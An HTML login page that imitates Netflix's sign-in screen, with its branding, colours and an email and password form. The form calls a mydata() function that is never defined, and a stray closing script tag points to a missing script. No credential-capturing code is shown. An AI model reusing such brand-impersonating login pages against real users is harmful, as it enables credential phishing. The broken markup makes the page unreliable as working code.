<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #141414;
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .login-container {
            width: 350px;
            background-color: #000;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.5);
        }
        .login-container h1 {
            font-size: 32px;
            margin-bottom: 20px;
        }
        .input-field {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            background: #333;
            border: none;
            border-radius: 5px;
            color: #fff;
            font-size: 16px;
        }
        .btn-login {
            width: 100%;
            padding: 10px;
            margin-top: 20px;
            background-color: #e50914;
            border: none;
            border-radius: 5px;
            color: #fff;
            font-size: 18px;
            cursor: pointer;
        }
        .btn-login:hover {
            background-color: #f40612;
        }
        .help-text {
            margin-top: 15px;
            font-size: 14px;
            color: #b3b3b3;
        }
        .help-text a {
            color: #b3b3b3;
            text-decoration: none;
        }
        .help-text a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>Sign In</h1>
        <form  onsubmit="return mydata()" action="sign in.html" >
            <input id="n1" type="email" class="input-field" placeholder="Email or phone number" required>
            <input id="n2" type="password" class="input-field" placeholder="Password" required>
            <button type="submit" class="btn-login">Sign In</button>
        </form>
        
            
        </script>
        <div class="help-text">
            <p>New to Netflix? <a href="#">Sign up now</a></p>
            <p><a href="#">Forgot your password?</a></p>
        </div>
    </div>
</body>
</html>
